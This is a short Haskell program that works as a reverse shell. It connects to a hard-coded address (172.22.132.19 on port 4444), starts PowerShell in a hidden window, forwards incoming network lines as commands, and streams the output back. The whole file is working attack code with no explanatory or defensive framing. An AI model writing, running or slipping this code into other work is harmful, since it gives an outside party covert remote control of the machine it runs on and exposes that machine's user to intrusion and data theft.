import Network.Socket
import System.IO
import Control.Monad
import System.Process
import Control.Concurrent (forkIO)
import Control.Exception (IOException, try)

reverseShell :: String -> String -> IO ()
reverseShell remoteHost remotePort = do
    -- Resolve address
    addrInfo <- getAddrInfo Nothing (Just remoteHost) (Just remotePort)
    let serverAddr = case addrInfo of
            (ai:_) -> addrAddress ai
            []     -> error "Could not resolve address"

    -- Create and connect socket
    sock <- socket AF_INET Stream defaultProtocol
    connect sock serverAddr

    -- Convert socket to handle
    handle <- socketToHandle sock ReadWriteMode
    hSetBuffering handle NoBuffering

    -- Start PowerShell in hidden mode
    let createProcessSpec = (proc "powershell.exe" ["-NoProfile", "-WindowStyle", "Hidden"])
          { std_in  = CreatePipe
          , std_out = CreatePipe
          , std_err = CreatePipe
          , create_group = True
          , new_session = True
          , close_fds = True
          }

    -- Launch PowerShell
    (Just hin, Just hout, Just herr, _) <- createProcess createProcessSpec
    hSetBuffering hin NoBuffering
    hSetBuffering hout NoBuffering
    hSetBuffering herr NoBuffering

    -- Function to forward PowerShell output to the network
    let forwardOutput h = forever $ do
            result <- try (hGetLine h) :: IO (Either IOException String)
            case result of
                Left _  -> return ()
                Right line -> do
                    hPutStrLn handle line
                    hFlush handle

    -- Run stdout and stderr forwarding in separate threads
    forkIO $ forwardOutput hout
    forkIO $ forwardOutput herr

    -- Read commands from network and send to PowerShell
    forever $ do
        cmd <- hGetLine handle
        hPutStrLn hin cmd
        hFlush hin

main :: IO ()
main = do
    let remoteHost = "172.22.132.19"
    let remotePort = "4444"
    reverseShell remoteHost remotePort
